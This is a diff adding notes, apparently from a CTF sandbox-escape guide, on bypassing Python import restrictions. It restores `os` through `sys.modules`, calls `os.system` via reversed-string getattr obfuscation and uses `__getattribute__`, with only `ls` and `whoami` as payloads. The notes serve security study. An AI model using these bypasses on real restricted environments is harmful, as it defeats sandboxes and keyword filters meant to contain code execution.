@@ -268,3 +268,44 @@ get_flag.__globals__['__builtins__'].__import__("os").system("ls")
 {% endtab %}
 {% endtabs %}
 
+## 3. Restriction on importing libraries 
+
+#### restore `sys.modules`
+
+When `os` is removed from `sys.modules`, it cannot be used anymore.
+
+```text
+wrong way:
+
+''' when importing a module, a new object would be created because there is not such a key in the dictionary'''
+>>> del sys.modules['os']
+
+correct way:
+
+>>> sys.modules['os'] = 'not allowed'
+>>> import os
+>>> os.system('ls')
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+AttributeError: 'str' object has no attribute 'system'
+```
+
+bypass it
+
+```text
+sys.modules['os'] = 'not allowed' # 
+
+del sys.modules['os']
+import os
+os.system('ls')
+```
+
+#### execute forbidden method
+
+```text
+import os
+getattr(os, 'metsys'[::-1])('whoami')
+
+os.__getattribute__('system')('ls')
+```
+
